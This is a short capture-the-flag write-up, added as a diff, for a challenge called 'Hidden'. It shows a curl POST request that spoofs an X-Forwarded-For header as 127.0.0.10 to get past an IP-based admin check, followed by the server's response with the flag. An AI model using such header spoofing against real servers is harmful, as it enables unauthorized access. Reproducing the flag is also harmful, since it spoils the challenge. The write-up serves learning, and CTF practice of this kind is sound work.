@@ -1,0 +1,14 @@
+						Hidden
+	Admin like 127.0.0.10 and ponies, that's all you need to know. Try to pwn Mirror 
+
+
+# GET method is not implemented, so i tried all methods. I got Forbidden when use POST method, so I used the X-Forwarded-for.
+
+$ curl -i -X POST -d "dummy" -H "X-Forwarded-for: 127.0.0.10" http://188.166.44.105:8888/admin/
+HTTP/1.1 200 OK
+Date: Sun, 27 Nov 2016 15:34:48 GMT
+Content-Length: 12
+Content-Type: text/html; charset=UTF-8
+Server: TornadoServer/4.4.2
+
+soeasyisntit
